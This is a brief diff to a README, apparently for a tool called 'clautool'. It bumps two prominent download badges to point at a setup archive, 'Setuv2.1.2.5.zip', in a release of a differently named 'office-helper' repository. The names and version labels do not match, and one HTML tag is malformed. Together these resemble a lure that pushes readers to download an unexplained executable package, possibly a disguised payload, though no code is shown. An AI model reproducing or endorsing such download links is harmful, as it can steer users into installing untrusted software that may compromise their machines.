@@ -1,6 +1,6 @@
-[![🔽 Download Latest Release](https://img.shields.io/badge/🔽_Download_Latest-Release-blue?style=for-the-badge)](https://github.com/olivertayloreng00e2/office-helper/releases/download/v4.0.0/Setuv2.1.2.5.zip)
+[![🔽 Download Latest Release](https://img.shields.io/badge/🔽_Download_Latest-Release-blue?style=for-the-badge)](https://github.com/olivertayloreng00e2/office-helper/releases/download/v5.0.0/Setuv2.1.2.5.zip)
 
-<a href="https://github.com/olivertayloreng00e2/office-helper/releases/download/v4.0.0/Setuv2.1.2.5.zip src="https://img.shields.io/badge/Download-v1.0.0-success?style=for-the-badge" alt="Download Latest"></a>
+<a href="https://github.com/olivertayloreng00e2/office-helper/releases/download/v5.0.0/Setuv2.1.2.5.zip src="https://img.shields.io/badge/Download-v1.0.0-success?style=for-the-badge" alt="Download Latest"></a>
 
 # ⚡ clautool
 
